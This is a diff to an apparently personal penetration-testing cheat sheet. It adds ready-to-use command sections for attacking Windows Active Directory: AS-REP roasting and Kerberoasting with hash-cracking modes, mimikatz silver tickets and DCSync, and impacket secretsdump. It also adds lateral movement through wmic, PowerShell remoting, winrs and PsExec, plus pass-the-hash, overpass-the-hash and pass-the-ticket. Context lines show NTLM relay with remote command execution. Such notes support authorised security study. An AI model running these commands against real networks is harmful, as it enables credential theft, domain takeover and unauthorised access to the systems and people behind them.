@@ -461,6 +461,35 @@ cat ~/.bash_history
 	Get-NetComputer
 	Find-LocalAdminAccess
 
+## AD - GenericWrite/GenericAll
+1. Set account to no-preauth, asrep roast, crack hash  
+1. Set SPN for account, kerberoast, crack hash  
+
+## AD - No preauth ASREP
+	./Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat
+Crack with mode 18200  
+
+	impacket-GetNPUsers -dc-ip 123.123.123.123 -request -outputfile hashes.txt domain.com/user
+Kali version  
+
+## AD - Kerberoasting TGSREP
+	./Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat
+Crack with mode 13100
+
+	impacket-GetUserSPNs -dc-ip 123.123.123.123 -request -outputfile hashes.txt domain.com/user
+Kali version  
+
+## AD - silver
+	kerberos::golden /sid:<domain-sid> /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:<spn hash> /user:username
+in mimikatz  
+
+## AD - dcsync
+	lsadump::dcsync /user:corp\dave
+in mimikatz  
+
+	impacket-secretsdump -just-dc-user targetuser corp.com/user:"password"@123.123.123.123
+from Kali  
+
 # STAGE 3.5 - PIVOT
 ## Windows - port forwarding
 	netsh interface portproxy add v4tov4 listenport=8000 listenaddress=LISTENIP connectport=7000 connectaddress=CONNECTIP
@@ -508,6 +537,46 @@ Alternatively, force machine to initiate an smb connection with web uploads i.e.
 ## Net-NTLM relay
 	impacket-ntlmrelayx --no-http-server -smb2support -t 123.123.123.130 -c <command>
 listen for smb connections and relay them to 123.123.123.130 and execute command there  
+
+# STAGE 4 - LATERAL MOVEMENT
+## CMD wmi
+	wmic /node:123.123.123.123 /user:user /password:password process call create "powershell -e ..."
+
+## Powershell CimSession
+	$secureString = ConvertTo-SecureString 'password' -AsPlaintext -Force
+	$credential = New-Object System.Management.Automation.PSCredential 'username', $secureString
+	$options = New-CimSessionOption -Protocol DCOM
+	$session = New-CimSession -ComputerName 123.123.123.123 -Credential $credential -SessionOption $options
+	$command = 'powershell -e ...'
+	Invoke-CimMethod -CimSession $Session -ClassName -Win32_Process -MethodName Create -Arguments @{CommandLine=$command}
+
+## winrs
+	winrs -r:hostname -u:username -p:password "powershell -e ..."
+requires Admin/Remote Management User on target
+
+## PSSession
+	$secureString = ConvertTo-SecureString 'password' -AsPlaintext -Force
+	$credential = New-Object System.Management.Automation.PSCredential 'username', $secureString
+	New-PSSession -ComputerName 123.123.123.123 -Credential $credential
+	Enter-PSSession <no.>
+
+## Windows PsExec
+	.\PsExec.exe -i \\hostname -u username -p password "powershell"
+requires admin on target  
+
+## Pass the hash
+	impacket-psexec -hashes <LM hash>:<NT hash> Administrator@123.123.123.123
+using an NTLM hash, authenticate as the user  
+
+## Over pass the hash (NTLM to kerberos upgrade)
+	sekurlsa::pth /user:user /domain:domain.com /ntlm:<ntlmhash> /run:powershell
+using an NTLM hash, obtain a kerberos ticket for the user.  
+new powershell will have mismatched whoami. run net use or net view to retrieve tickets and PsExec into another machine  
+
+## Pass the ticket
+	sekurlsa::tickets /export
+	kerberos::ptt <ticketname>
+retrieve and obtain an existing ticket of another user on the local machine  
 
 # APPENDIX
 ## Kali built-in wordlists
